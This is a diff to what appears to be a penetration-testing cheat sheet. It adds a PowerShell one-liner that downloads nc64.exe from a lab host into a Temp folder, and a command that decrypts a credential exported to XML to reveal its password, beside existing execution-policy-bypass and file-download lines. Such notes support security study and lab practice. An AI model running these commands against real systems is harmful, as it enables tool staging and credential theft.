@@ -50,6 +50,8 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 * PowerShell File Transfers
 
 ```
+powershell Invoke-Webrequest -Uri http://10.10.14.74:4757/nc64.exe -OutFile C:\Data\Users\DefaultAccount\AppData\Local\Temp\nc64.exe
+
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 ```
 
@@ -405,7 +407,10 @@ MIB Values
 
 ```
 // temporarily allow unsigned scripts to execute
-powershell -ExecutionPolicy Bypass -File admin_login.psl
+powershell -ExecutionPolicy Bypass -File admin_login.ps1
+
+// decrypt securestring exported to xml file
+powershell -c "$credential = Import-CliXml -Path c:\creds.xml;$credential.GetNetworkCredential().Password"
 ```
 
 ## Running local http servers
